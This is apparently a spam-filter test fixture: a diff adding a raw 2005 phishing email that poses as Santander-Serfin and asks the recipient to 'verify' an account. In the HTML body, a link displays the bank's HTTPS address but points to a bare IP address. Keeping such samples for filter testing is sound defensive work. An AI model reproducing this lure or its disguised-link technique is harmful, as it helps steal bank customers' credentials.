@@ -1,0 +1,130 @@
+From nobody Sun Jan 25 13:48:11 2015
+Return-Path: <nobody@server1.accessitalia.com>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id D62FA53708A
+ for <nobody@login.example.com>; Wed, 23 Nov 2005 18:03:38 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id C1F136FA405
+ for <nobody@example.com>; Wed, 23 Nov 2005 18:03:36 -0500 (EST)
+Received: from lujan.example.com (foo.example.com [10.2.3.4])
+ by mail2.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Wed, 23 Nov 2005 18:03:36 -0500 (EST)
+Received: by lujan.example.com (Postfix)
+ id 162161BC4B; Thu, 24 Nov 2005 00:03:33 +0100 (CET)
+Delivered-To: foobee@example.com
+Received: from localhost (unknown [127.0.0.1])
+ by lujan.example.com (Postfix) with ESMTP id 1AE581BC40
+ for <foobee@example.com>; Wed, 23 Nov 2005 23:03:31 +0000 (UTC)
+Received: from lujan.example.com ([10.2.3.4])
+ by localhost (lujan [10.2.3.4]) (amavisd-new, port 10024)
+ with ESMTP id 26796-04 for <foobee@example.com>;
+ Thu, 24 Nov 2005 00:03:00 +0100 (CET)
+Received: from server1.accessitalia.com (server1.accessitalia.com
+ [216.23.188.120])
+ by lujan.example.com (Postfix) with ESMTP id 6FFB91BC3E
+ for <foobee@example.com>; Thu, 24 Nov 2005 00:02:57 +0100 (CET)
+Received: from nobody by server1.accessitalia.com with local (Exim 4.52)
+ id 1Ef3dZ-00073n-0L
+ for foobee@example.com; Wed, 23 Nov 2005 22:02:27 -0100
+To: foobee@example.com
+Subject: Proceso Seguro De la Verificacion De Santander-Serfin
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: support@santander.com.mx <support@santander.com.mx>
+Message-Id: <E1Ef3dZ-00073n-0L@server1.accessitalia.com>
+Date: Wed, 23 Nov 2005 22:02:27 -0100
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server1.accessitalia.com
+X-AntiAbuse: Original Domain - example.com
+X-AntiAbuse: Originator/Caller UID/GID - [99 99] / [47 12]
+X-AntiAbuse: Sender Address Domain - server1.accessitalia.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: *
+X-Spam-Status: No, score=1.8 required=5.0 tests=HTML_MESSAGE, HTML_TITLE_EMPTY,
+ MIME_HTML_ONLY,NORMAL_HTTP_TO_IP,RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK 
+ autolearn=no version=3.0.2
+X-Spam-Report: * 0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address
+ in URL *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf:  54]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  0.0 HTML_TITLE_EMPTY BODY: HTML title contains no text
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 30
+
+
+
+
+<HTML>
+<HEAD>
+<META NAME="GENERATOR" Content="Microsoft DHTML Editing Control">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<P><IMG alt="" hspace=0 
+src="http://www.santander-serfin.com/publishapp/schmex/fijos/images/logo.gif" 
+align=baseline border=0></P>
+<P><FONT size=2><FONT color=#000080 size=2><FONT face="Microsoft Sans Serif" 
+color=#000080 size=2>Estimado usuario de 
+Santander-Serfin,</FONT></FONT></FONT></P>
+<P><FONT size=2><FONT color=#000080 size=2><FONT face="Microsoft Sans Serif" 
+color=#000080 size=2>Como la parte de nuestro compromiso continuo proteger su 
+cuenta y para reducir el caso del fraude en nuestro </FONT></FONT></FONT><FONT 
+size=2><FONT color=#000080 size=2><FONT face="Microsoft Sans Serif" 
+color=#000080 size=2>sitio web, nosotros emprendemos una revisión del período de 
+nuestras cuentas de miembro. Usted es solicitado para visitar nuestro sitio 
+siguiendo la conexión dada abajo</FONT></FONT></FONT></P>
+<P><FONT size=2><FONT color=#000080 size=2><FONT face="Microsoft Sans Serif" 
+color=#0000ff size=2><FONT face="Times New Roman"><A 
+href="http://140.122.83.246/ATutor/.www.santander-serfin.com/publishapp/schmex/html/main.htm">https://www.santander-serfin.com/publishapp/schmex/html/main.htm</A></FONT><A 
+< U></FONT><FONT face="Microsoft Sans Serif" color=#000080 
+size=2></FONT></A></FONT></FONT></P>
+<P><FONT size=2><FONT color=#000080 size=2><FONT face="Microsoft Sans Serif" 
+color=#000080 size=2>Llene por favor la información requerida. Esto se requiere 
+para nosotros continuar ofrecerle un seguro y el riesgo liberta el ambiente para 
+correr sus subastas, y mantener la experiencia de Santander-Serfin. 
+</FONT></FONT></FONT></P>
+<P><FONT size=2><FONT color=#000080 size=2><FONT face="Microsoft Sans Serif" 
+color=#000080 size=2>Gracias Da cuenta la Administración tal como planteada en 
+nuestro Acuerdo de Usuario, Santander-Serfin periódicamente le mandará 
+información acerca de cambios de sitio y aumentos. Visite nuestra Política de la 
+Intimidad y el Acuerdo de Usuario si usted tiene cualquiera pregunta. 
+</P></FONT></FONT></FONT><FONT size=2>
+<HR color=#cccccc noShade SIZE=1>
+
+<P align=center><STRONG><FONT color=#808080>&nbsp;| </FONT><FONT 
+color=#5d5d5d><A href="http://santander.mapasactivos.com/">sucursales y 
+cajeros</A>&nbsp;|&nbsp;&nbsp;<A 
+href="http://www.santander.com.mx/PDF/canalfin/html/f_canalindex.html">info. de 
+mercados</A>&nbsp;&nbsp;| <IMG alt="" hspace=0 
+src="http://www.santander-serfin.com/publishapp/schmex/fijos/images/superLinea.gif" 
+align=baseline border=0><A 
+href="http://www.santander.com.mx/PDF/canalfin/html/f_canalindex.html">Superlínea</A></FONT><FONT 
+color=#000000>&nbsp;&nbsp;</FONT><FONT color=#5d5d5d>|</FONT></STRONG><FONT 
+color=#000000><STRONG>&nbsp;</STRONG><FONT color=#5d5d5d><A 
+href="http://www.santander-serfin.com/publishapp/schmex/html/main.htm">contáctanos</A></FONT><STRONG>&nbsp;<FONT 
+color=#5d5d5d>|</FONT></STRONG></FONT><FONT color=#000000>&nbsp;</FONT><FONT 
+style="BACKGROUND-COLOR: #ed1c24" color=#ffffff><FONT 
+style="BACKGROUND-COLOR: #ffffff" color=#5d5d5d><A 
+href="http://santander.mapasactivos.com/">emergencias&nbsp;</A>&nbsp;|&nbsp; <A 
+href="http://santander.mapasactivos.com/">mapa</A></FONT><FONT 
+color=#0000ff><FONT 
+style="BACKGROUND-COLOR: #ffffff">&nbsp;</FONT></FONT></FONT></P>
+<P align=center><FONT color=#808080>®&nbsp;Banco Santander Serfin, S.A., 2002. 
+</FONT><FONT color=#808080>aviso legal.</FONT></A></P>
+<P align=left><FONT face="Arial, Helvetica, sans-serif" color=#cccccc 
+size=1></FONT>&nbsp;</P>
+<P><U><IMG height=1 src="http://inet.banamex.com.mx/servlet/InetId?Neg=Portal" 
+width=1></U></P></FONT>
+</BODY>
+</HTML>
